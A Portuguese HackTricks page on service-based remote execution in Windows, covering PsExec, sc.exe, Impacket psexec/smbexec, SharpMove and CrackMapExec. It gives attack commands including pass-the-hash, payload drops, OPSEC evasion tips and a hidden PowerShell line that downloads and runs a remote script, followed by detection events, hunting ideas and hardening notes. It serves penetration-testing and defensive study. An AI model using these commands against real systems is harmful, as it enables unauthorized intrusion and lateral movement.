# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Como funcionam

Essas técnicas abusam remotamente do Windows Service Control Manager (SCM) por SMB/RPC para executar comandos em um host-alvo. O fluxo comum é:

1. Autenticar-se no alvo e acessar o compartilhamento ADMIN$ por SMB (TCP/445).
2. Copiar um executável ou especificar uma linha de comando LOLBAS que o serviço executará.
3. Criar um serviço remotamente por meio do SCM (MS-SCMR sobre \PIPE\svcctl), apontando para esse comando ou binário.
4. Iniciar o serviço para executar o payload e, opcionalmente, capturar stdin/stdout por meio de um named pipe.
5. Parar o serviço e fazer a limpeza (excluir o serviço e quaisquer binários deixados no alvo).

Requisitos/pré-requisitos:
- Administrador Local no alvo (SeCreateServicePrivilege) ou direitos explícitos para criação de serviços no alvo.
- SMB (445) acessível e compartilhamento ADMIN$ disponível; Remote Service Management permitido pelo firewall do host.
- UAC Remote Restrictions: com contas locais, a filtragem de tokens pode bloquear administradores pela rede, a menos que seja usado o Administrator integrado ou LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar um hostname/FQDN habilita Kerberos; conectar-se por IP geralmente faz fallback para NTLM (e isso pode ser bloqueado em ambientes hardened).

### ScExec/WinExec manual via sc.exe

A seguir, é apresentada uma abordagem mínima para criação de serviços. A imagem do serviço pode ser um EXE deixado no alvo ou um LOLBAS como cmd.exe ou powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Espere um erro de timeout ao iniciar um EXE que não seja um serviço; a execução ainda ocorrerá.
- Para manter uma OPSEC mais discreta, prefira comandos fileless (`cmd /c`, `powershell -enc`) ou exclua os artefatos deixados no sistema.

Encontre etapas mais detalhadas em: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Ferramentas e exemplos

### Sysinternals PsExec.exe

- Ferramenta clássica de administração que usa SMB para fazer o drop de PSEXESVC.exe em ADMIN$, instala um serviço temporário (nome padrão PSEXESVC) e faz proxy de I/O por meio de named pipes.
- Exemplos de uso:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Você pode executar diretamente do Sysinternals Live via WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Deixa eventos de instalação/desinstalação de serviço (o nome do serviço geralmente é PSEXESVC, a menos que -r seja usado) e cria C:\Windows\PSEXESVC.exe durante a execução.

### Impacket psexec.py (PsExec-like)

- Usa um serviço semelhante ao RemCom incorporado. Solta um binário de serviço temporário (geralmente com nome aleatório) via ADMIN$, cria um serviço (por padrão, geralmente RemComSvc) e faz proxy de I/O por meio de um named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefatos
- EXE temporário em C:\Windows\ (8 caracteres aleatórios). O nome do serviço, por padrão, é RemComSvc, a menos que seja substituído.

### Impacket smbexec.py (SMBExec)

- Cria um serviço temporário que inicia o cmd.exe e usa um named pipe para I/O. Geralmente evita deixar um payload EXE completo; a execução de comandos é semi-interativa.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa vários métodos de lateral movement, incluindo execução baseada em serviços.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inclui modificação/criação de serviços para executar um comando remotamente.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Você também pode usar o CrackMapExec para executar por meio de diferentes backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detecção e artefatos

Artefatos típicos de host/rede ao usar técnicas semelhantes ao PsExec:
- Security 4624 (Logon Type 3) e 4672 (Special Privileges) no alvo para a conta de admin utilizada.
- Security 5140/5145 File Share e File Share Detailed mostrando acesso ao ADMIN$ e criação/gravação de binários de serviço (por exemplo, PSEXESVC.exe ou um .exe aleatório de 8 caracteres).
- Security 7045 Service Install no alvo: nomes de serviço como PSEXESVC, RemComSvc ou personalizados (-r / -service-name).
- Sysmon 1 (Process Create) para services.exe ou para a imagem do serviço, 3 (Network Connect), 11 (File Create) em C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_*, ou equivalentes randomizados.
- Artefato no Registry para o EULA do Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 no host do operador (se não suprimido).

Ideias de hunting
- Gerar alertas para instalações de serviços cujo ImagePath inclua cmd.exe /c, powershell.exe ou localizações TEMP.
- Procurar criações de processos em que ParentImage seja C:\Windows\PSEXESVC.exe ou filhos de services.exe executados como LOCAL SYSTEM executando shells.
- Sinalizar named pipes terminando com -stdin/-stdout/-stderr ou nomes de pipes conhecidos de clones do PsExec.

## Solução de problemas de falhas comuns
- Access is denied (5) ao criar serviços: não é realmente admin local, restrições de UAC remoto para contas locais ou proteção contra adulteração do EDR no caminho do binário do serviço.
- The network path was not found (53) ou não foi possível conectar ao ADMIN$: firewall bloqueando SMB/RPC ou admin shares desativados.
- Kerberos falha, mas NTLM está bloqueado: conecte usando hostname/FQDN (não IP), garanta SPNs corretos ou forneça -k/-no-pass com tickets ao usar Impacket.
- O tempo limite de inicialização do serviço é atingido, mas o payload foi executado: esperado quando não se trata de um binário de serviço real; capture a saída em um arquivo ou use smbexec para I/O em tempo real.

## Notas de hardening
- Windows 11 24H2 e Windows Server 2025 exigem SMB signing por padrão para conexões de saída (e conexões de entrada no Windows 11). Isso não impede o uso legítimo do PsExec com credenciais válidas, mas impede abusos de SMB relay sem assinatura e pode afetar dispositivos que não oferecem suporte a signing.<sup>[[2]](#references)</sup>
- O novo bloqueio de NTLM do cliente SMB (Windows 11 24H2/Server 2025) pode impedir o fallback para NTLM ao conectar por IP ou a servidores que não usam Kerberos. Em ambientes com hardening, isso interromperá PsExec/SMBExec baseado em NTLM; use Kerberos (hostname/FQDN) ou configure exceções quando legitimamente necessário.<sup>[[2]](#references)</sup>
- Princípio do menor privilégio: minimize a associação a admins locais, prefira Just-in-Time/Just-Enough Admin, imponha LAPS e monitore/alerte sobre instalações de serviços 7045.

## Veja também

- Execução remota baseada em WMI (frequentemente mais fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Execução remota baseada em WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## Referências

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
